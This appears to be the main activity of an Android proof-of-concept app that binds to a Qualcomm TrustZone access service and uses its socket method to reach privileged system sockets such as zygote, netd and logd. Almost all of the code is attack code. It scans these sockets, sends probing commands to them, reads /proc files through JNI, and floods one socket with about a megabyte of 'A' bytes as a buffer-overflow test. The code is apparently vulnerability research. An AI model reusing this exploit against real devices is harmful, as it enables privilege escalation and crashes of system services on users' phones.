package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
    private static final String PROPERTY_SERVICE_PATH = "/dev/socket/mdnsd";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd mTZService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;
    private List<String> successSockets = new ArrayList<>();

    static {
        System.loadLibrary("pocjni");
    }

    public static native ParcelFileDescriptor nativeConnectSocket(IMinkSocketFd tzService, String path, int[] handleArr);
    public static native String nativeReadFile(String path);
    public static native int nativeSendLongData(ParcelFileDescriptor pfd, byte[] data, int len);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("[TZ] Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            stopRequested.set(false);
            testThread = new Thread(() -> executeFullTest());
            testThread.start();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("TZ disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        appendLog("========================================");
        appendLog("========== TZAccess Socket Scan ==========");

        String[] allSockets = {
            "/dev/socket/mdnsd",
            "/dev/socket/tcm",
            "/dev/socket/fwmarkd",
            "/dev/socket/dnsproxyd",
            "/dev/socket/logd",
            PROPERTY_SERVICE_PATH,
            "/dev/socket/ssgqmig",
            "/dev/socket/minksocket",
            "/dev/socket/netd",
            "/dev/socket/location",
            "/dev/socket/zygote",
            "/dev/socket/zygote_secondary"
        };

        for (String path : allSockets) {
            if (stopRequested.get()) break;
            testSocketJava(path);
        }

        appendLog("========== SUCCESSFUL SOCKETS (Java) ==========");
        if (successSockets.isEmpty()) {
            appendLog("  No successful sockets");
        } else {
            for (String s : successSockets) {
                appendLog("  " + s);
            }
        }

        appendLog("========== Testing via JNI ==========");
        if (mTZService != null && !successSockets.isEmpty()) {
            for (String path : successSockets) {
                if (stopRequested.get()) break;
                testSocketJNI(path);
            }
        } else {
            appendLog("  No successful sockets or TZ service null");
        }

        appendLog("========== JNI File Read Test ==========");
        String[] files = {"/proc/version", "/proc/self/status"};
        for (String f : files) {
            if (stopRequested.get()) break;
            try {
                String content = nativeReadFile(f);
                if (content != null && !content.isEmpty()) {
                    appendLog("[JNI] Read " + f + ": " + content.substring(0, Math.min(200, content.length())));
                } else {
                    appendLog("[JNI] Failed to read " + f + " (empty or null)");
                }
            } catch (Exception e) {
                appendLog("[JNI] Read " + f + " error: " + e.getMessage());
            }
        }

        if (!successSockets.isEmpty()) {
            appendLog("========== Interacting with successful sockets ==========");
            for (String s : successSockets) {
                if (stopRequested.get()) break;
                if (s.equals(PROPERTY_SERVICE_PATH)) continue;
                interactWithSocket(s);
            }
        }

        if (successSockets.contains(PROPERTY_SERVICE_PATH)) {
            appendLog("========== Buffer Overflow Test via JNI ==========");
            testBufferOverflow();
        } else {
            appendLog("========== Property Service not available, skipping overflow test ==========");
        }

        appendLog("========== ALL TESTS COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testSocketJava(String path) {
        appendLog("[SCAN-JAVA] Testing: " + path);
        if (mTZService == null) {
            appendLog("  TZ service null");
            return;
        }
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = mTZService.a(path, iArr);
            if (pfd == null) {
                appendLog("  [FAIL] No FD");
                return;
            }
            appendLog("  [SUCCESS] Got FD: " + iArr[0]);
            successSockets.add(path);
            pfd.close();
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("  Error: " + e.getMessage());
        }
    }

    private void testSocketJNI(String path) {
        appendLog("[SCAN-JNI] Testing: " + path);
        if (mTZService == null) {
            appendLog("  TZ service null");
            return;
        }
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = nativeConnectSocket(mTZService, path, iArr);
            if (pfd == null) {
                appendLog("  [FAIL] No FD from JNI");
                return;
            }
            appendLog("  [SUCCESS] JNI got FD: " + iArr[0]);
            pfd.close();
        } catch (Exception e) {
            appendLog("  JNI error: " + e.getMessage());
        }
    }

    private void interactWithSocket(String path) {
        appendLog("[INTERACT] " + path);
        ParcelFileDescriptor pfd = null;
        try {
            int[] iArr = new int[1];
            pfd = mTZService.a(path, iArr);
            if (pfd == null) {
                appendLog("  Re-connect failed");
                return;
            }
            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
            if (fdesc == null || !fdesc.valid()) {
                appendLog("  FD invalid");
                pfd.close();
                return;
            }

            OutputStream os = new FileOutputStream(fdesc);
            InputStream is = new FileInputStream(fdesc);

            String[] cmds = {"help", "status", "version", "getprop", "list", "dump", "\n"};
            for (String cmd : cmds) {
                if (stopRequested.get()) break;
                try {
                    os.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    String resp = readWithTimeout(is, 500);
                    if (resp != null && !resp.isEmpty()) {
                        appendLog("  CMD[" + cmd + "] -> " + resp);
                    } else {
                        appendLog("  CMD[" + cmd + "] -> (no response)");
                    }
                } catch (Exception e) {
                    appendLog("  CMD[" + cmd + "] error: " + e.getMessage());
                }
                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            }

            os.close();
            is.close();
            pfd.close();
        } catch (Exception e) {
            appendLog("  Interaction error: " + e.toString());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private String readWithTimeout(InputStream is, int timeoutMs) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        long start = System.currentTimeMillis();
        byte[] buffer = new byte[512];
        try {
            while (System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int len = is.read(buffer);
                    if (len > 0) baos.write(buffer, 0, len);
                    else break;
                } else {
                    Thread.sleep(30);
                }
            }
            return baos.toString(StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return null;
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "tz_jni_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ JNI PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "検査が終了したから終了しま~す", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 2000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }

    private void testBufferOverflow() {
        ParcelFileDescriptor pfd = null;
        try {
            int[] iArr = new int[1];
            pfd = mTZService.a(PROPERTY_SERVICE_PATH, iArr);
            if (pfd == null) {
                appendLog("[BOF] Failed to get FD for property_service");
                return;
            }
            byte[] pattern = "AAAAAA".getBytes(StandardCharsets.UTF_8);
            int totalSize = 4096 * 256;
            byte[] payload = new byte[totalSize];
            for (int i = 0; i < totalSize; i++) {
                payload[i] = pattern[i % pattern.length];
            }
            appendLog("[BOF] Sending " + totalSize + " bytes of 'hellooo' pattern via JNI...");
            int written = nativeSendLongData(pfd, payload, payload.length);
            appendLog("[BOF] JNI write returned: " + written);
        } catch (Exception e) {
            appendLog("[BOF] Error: " + e.toString());
        } finally {
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }
}
